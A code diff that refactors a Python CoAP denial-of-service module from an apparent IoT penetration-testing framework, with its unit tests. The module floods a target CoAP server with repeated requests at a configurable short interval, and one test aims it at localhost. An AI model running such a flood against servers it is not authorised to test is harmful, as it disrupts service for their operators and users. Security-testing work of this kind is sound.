@@ -1,23 +1,21 @@
-from coapthon.client.helperclient import HelperClient
-from protocols import CoAP as PeniotCoAP
-
-import multiprocessing
 import logging
-import time
+import multiprocessing
 import signal
-import sys
+import time
 import unittest
 
-from Entity.attack import Attack
-from Entity.input_format import InputFormat
+from coapthon.client.helperclient import HelperClient
 
-"""
-    CoAP Protocol - DoS Attack Module
-    It is created to penetrate CoAP server with tiny interval messages by sending again and again messages
-"""
+from ....Entity.attack import Attack
+from ....Entity.input_format import InputFormat
+from ....protocols import CoAP as PeniotCoAP
 
 
 class CoAPDoSAttack(Attack):
+    """
+    CoAP Protocol - DoS Attack Module
+    It is created to penetrate CoAP server with tiny interval messages by sending again and again messages
+    """
     client = None
 
     # Input Fields
@@ -32,7 +30,7 @@ class CoAPDoSAttack(Attack):
     # Miscellaneous Members
     logger = None
     sent_message_count = 0  # Transmitted fuzzing packets
-    stoppedFlag = False
+    stopped_flag = False
 
     def __init__(self):
         default_parameters = ["", "", "", "", "", 10.0]
@@ -60,7 +58,7 @@ class CoAPDoSAttack(Attack):
 
     def stop_attack(self):
         self.logger.info("Sent message count: {0}, exitting...".format(self.sent_message_count))
-        self.stoppedFlag = True
+        self.stopped_flag = True
         if self.client is not None:
             self.client.stop()
         time.sleep(2)  # Sleep two seconds so the user can see the message
@@ -74,7 +72,7 @@ class CoAPDoSAttack(Attack):
         self.pre_attack_init()
 
         # Start client loop for requests
-        while self.stoppedFlag is False:
+        while self.stopped_flag is False:
             self.sent_message_count += 1
             response = PeniotCoAP.make_request(self.client, self.path, self.method, self.payload)
             self.logger.info("Received message = {0}".format(str(response.line_print)))
@@ -88,22 +86,22 @@ class TestCoAPDoSAttack(unittest.TestCase):
     def tearDown(self):
         pass
 
-    def testName(self):
+    def test_name(self):
         self.assertEqual("CoAP DoS Attack", self.coap_dos_attack.get_attack_name())
 
-    def testInputs(self):
+    def test_inputs(self):
         inputs = self.coap_dos_attack.get_inputs()
         self.assertIsNotNone(inputs)
         self.assertGreater(len(inputs), 0, "Non inserted inputs")
         self.assertEquals(len(inputs), 6)
 
-    def testNonInitializedInputs(self):
+    def test_non_initialized_inputs(self):
         inputs = self.coap_dos_attack.get_inputs()
         for _input in inputs:
             value = getattr(self.coap_dos_attack, _input.get_name())
             self.assertTrue(value is None or type(value) == _input.get_type())
 
-    def testAfterGettingInputs(self):
+    def test_after_getting_inputs(self):
         example_inputs = ["a.b.c.d", 8888, "peniot-coap-test", "pOst", "peniot", 13.2]
         for index, _input in enumerate(example_inputs):
             self.coap_dos_attack.inputs[index].set_value(_input)
@@ -118,7 +116,7 @@ class TestCoAPDoSAttack(unittest.TestCase):
             value = getattr(self.coap_dos_attack, _input.get_name())
             self.assertEqual(example_inputs[index], value)
 
-    def testDoSAttack(self):
+    def test_dos_attack(self):
         def run_attack():
             example_inputs = ["127.0.0.1", 5683, "peniot", "get", "peniot", 0.01]
             for index, _input in enumerate(example_inputs):
